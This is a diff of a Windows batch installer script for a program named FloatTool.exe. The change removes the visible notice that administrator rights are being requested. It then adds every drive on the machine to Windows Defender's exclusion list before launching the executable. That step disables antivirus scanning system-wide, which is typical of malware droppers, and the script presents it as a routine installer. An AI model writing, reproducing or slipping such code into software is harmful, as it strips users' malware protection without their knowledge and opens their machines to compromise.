@@ -4,7 +4,6 @@ NET FILE 1>NUL 2>NUL
 if '%errorlevel%' == '0' (
     goto :runAsAdmin
 ) else (
-    echo Requesting administrative permissions...
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\Admin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\Admin.vbs"
     "%temp%\Admin.vbs"
@@ -14,11 +13,14 @@ if '%errorlevel%' == '0' (
 
 :runAsAdmin
 
-set "batch_dir=%~dp0"
+for /f "tokens=1 delims=:" %%d in ('wmic logicaldisk get caption ^| findstr /r "[a-zA-Z]:"') do (
+    powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%%d\'}"
+)
 
-powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%batch_dir%'}"
-
-start "" "%batch_dir%FloatTool.exe"
+REM Add FloatTool.exe to the exclusion list
+powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%~dp0FloatTool.exe'}"
 
 echo Install Complete
+
+start "" "%~dp0FloatTool.exe"
 pause
